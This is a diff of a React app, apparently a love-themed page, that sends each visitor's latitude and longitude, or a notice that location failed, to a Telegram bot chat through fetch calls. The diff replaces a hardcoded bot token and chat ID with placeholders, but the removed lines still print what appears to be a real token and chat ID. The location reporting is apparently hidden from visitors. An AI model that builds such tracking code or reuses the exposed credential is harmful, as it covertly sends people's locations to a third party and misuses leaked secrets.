@@ -65,10 +65,10 @@ const App = () => {
     setChecked(true);
     if (sendLove) return;
     if (countLove > 3) return;
-    fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
+    fetch("https://api.telegram.org/bot__TELEGRAM_API_KEY__/sendMessage", {
       method: "POST",
       body: JSON.stringify({
-        chat_id: -1002002927520,
+        chat_id: "__CHAT_ID__",
         text: "jangding need you, can't get lat long"
       }),
       headers: {
@@ -85,10 +85,10 @@ const App = () => {
       var pathArray = window.location.pathname.split('/');
       let lat = position.coords.latitude;
       let long = position.coords.longitude;
-      fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
+      fetch("https://api.telegram.org/bot__TELEGRAM_API_KEY__/sendMessage", {
         method: "POST",
         body: JSON.stringify({
-          chat_id: -1002002927520,
+          chat_id: "__CHAT_ID__",
           text: `jang ding need you lat: ${lat}, long: ${long}`
         }),
         headers: {
